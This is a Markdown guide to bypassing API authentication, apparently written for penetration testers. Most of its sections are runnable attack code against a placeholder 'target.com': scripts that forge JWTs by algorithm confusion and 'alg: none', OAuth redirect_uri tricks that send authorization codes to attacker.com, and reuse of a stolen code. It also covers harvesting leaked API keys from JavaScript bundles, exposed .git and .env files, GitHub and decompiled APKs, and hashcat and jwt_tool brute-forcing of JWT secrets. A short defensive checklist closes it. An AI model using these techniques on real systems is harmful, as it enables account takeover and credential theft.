# API Authentication Bypass Guide

> Techniques for testing API authentication mechanisms including JWT manipulation, OAuth flaws, API key leakage, and token-based attack vectors.

---

## 1. JWT Manipulation Attacks

JSON Web Tokens are widely used for API authentication. Misconfigurations in signature verification create critical bypass opportunities.

```bash
# Decode JWT without verification to inspect claims
echo "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.signature" \
  | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

```python
# Algorithm confusion attack: RS256 to HS256
# If server accepts HS256 signed with the public key
import jwt
import requests

# Obtain the server's public key
public_key = requests.get("https://target.com/.well-known/jwks.json").json()
# Or from: https://target.com/api/public-key

# Forge token signed with public key using HS256
forged_token = jwt.encode(
    {"sub": "admin", "role": "admin", "iat": 1700000000, "exp": 1800000000},
    key=open("public_key.pem").read(),
    algorithm="HS256"
)
print(f"Forged token: {forged_token}")

# Test the forged token
resp = requests.get(
    "https://target.com/api/admin/users",
    headers={"Authorization": f"Bearer {forged_token}"}
)
print(f"Status: {resp.status_code}, Body: {resp.text[:200]}")
```

```bash
# None algorithm attack
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"admin","role":"admin"}
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","exp":1800000000}' | base64 | tr -d '=' | tr '/+' '_-')
TOKEN="${HEADER}.${PAYLOAD}."

curl -s https://target.com/api/admin \
  -H "Authorization: Bearer $TOKEN" | jq .
```

---

## 2. OAuth Flow Exploitation

```bash
# Redirect URI manipulation - open redirect to steal auth code
# Legitimate: redirect_uri=https://app.com/callback
# Attack: redirect_uri=https://app.com.attacker.com/callback
# Attack: redirect_uri=https://app.com/callback/../../../attacker.com

curl -v "https://auth.target.com/authorize?\
client_id=legitimate_client&\
response_type=code&\
redirect_uri=https://app.com%40attacker.com/steal&\
scope=read+write&\
state=random123"
```

```python
# OAuth state parameter CSRF test
import requests
from urllib.parse import urlparse, parse_qs

# Step 1: Initiate OAuth flow without state parameter
auth_url = "https://auth.target.com/authorize"
params = {
    "client_id": "app_client_id",
    "response_type": "code",
    "redirect_uri": "https://app.com/callback",
    "scope": "read write",
    # Deliberately omit state parameter
}

resp = requests.get(auth_url, params=params, allow_redirects=False)
print(f"Status: {resp.status_code}")
print(f"Location: {resp.headers.get('Location', 'N/A')}")

# If server allows flow without state, CSRF is possible
# Attacker can pre-authorize their own account and force victim to link it

# Step 2: Test if authorization code can be reused
code = "stolen_auth_code"
token_resp = requests.post("https://auth.target.com/token", data={
    "grant_type": "authorization_code",
    "code": code,
    "redirect_uri": "https://app.com/callback",
    "client_id": "app_client_id",
    "client_secret": "app_secret"
})
print(f"Token response: {token_resp.json()}")
```

---

## 3. API Key Leakage Discovery

```bash
# Search for exposed API keys in common locations
# JavaScript bundles
curl -s https://target.com/static/js/main.js | grep -oP '(api[_-]?key|apikey|api_secret|access_token)["\s:=]+["\s]*[A-Za-z0-9_\-]{20,}'

# Git history exposure
curl -s https://target.com/.git/config
curl -s https://target.com/.env

# Common API key patterns in response headers
curl -sI https://target.com/api/v1/health | grep -i "x-api-key\|x-auth\|authorization"

# Search GitHub for leaked keys (using gh CLI)
gh search code "target.com api_key" --limit 20
gh search code "AKIA" --filename .env --limit 10
```

```bash
# Trufflehog scan for API key patterns in public repos
trufflehog git https://github.com/target-org/target-repo --only-verified

# Search for keys in APK/mobile apps
apktool d target.apk -o target_decompiled
grep -rn "api_key\|api_secret\|Bearer\|sk_live\|pk_live" target_decompiled/
```

---

## 4. Token Privilege Escalation

```bash
# Test horizontal privilege escalation by modifying JWT claims
# Decode current token
TOKEN="your.jwt.token"
PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null)
echo "Current claims: $PAYLOAD"

# If using weak/known signing key, forge elevated token
python3 -c "
import jwt
token = jwt.encode(
    {'sub': 'user123', 'role': 'admin', 'permissions': ['read','write','delete','admin']},
    'secret',  # Common weak secrets: secret, password, 123456, key
    algorithm='HS256'
)
print(token)
"
```

```bash
# JWT secret brute-force with hashcat
# Extract hash from JWT for cracking
echo -n "$TOKEN" > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force

# Or use jwt_tool for comprehensive testing
jwt_tool "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt
jwt_tool "$TOKEN" -X a  # Algorithm none attack
jwt_tool "$TOKEN" -X k  # Key confusion attack
```

---

## 5. Bearer Token Theft Vectors

```bash
# Test for token leakage in referrer headers
# If API redirects to external URL, token may leak via Referer
curl -v "https://target.com/api/redirect?url=https://attacker.com" \
  -H "Authorization: Bearer $TOKEN" 2>&1 | grep -i "referer\|location"

# Test token exposure in server logs via GET parameters
# Insecure: token in URL query string
curl -s "https://target.com/api/data?access_token=$TOKEN"

# Check if token survives downgrade to HTTP
curl -v "http://target.com/api/data" \
  -H "Authorization: Bearer $TOKEN" 2>&1 | grep -i "location\|strict-transport"
```

---

## 6. Defense Validation Checklist

```yaml
# Security controls to verify are in place
authentication_checks:
  jwt:
    - algorithm_whitelist: ["RS256", "ES256"]  # Never allow "none" or HS256 with public key
    - expiration_enforced: true
    - issuer_validated: true
    - audience_validated: true
  oauth:
    - state_parameter_required: true
    - redirect_uri_exact_match: true
    - pkce_enforced: true  # For public clients
    - code_single_use: true
  api_keys:
    - rotation_policy: "90_days"
    - scope_limited: true
    - never_in_url: true
    - server_side_only: true
```

Always test authentication mechanisms in a controlled environment with proper authorization. Document findings with evidence and provide remediation guidance.
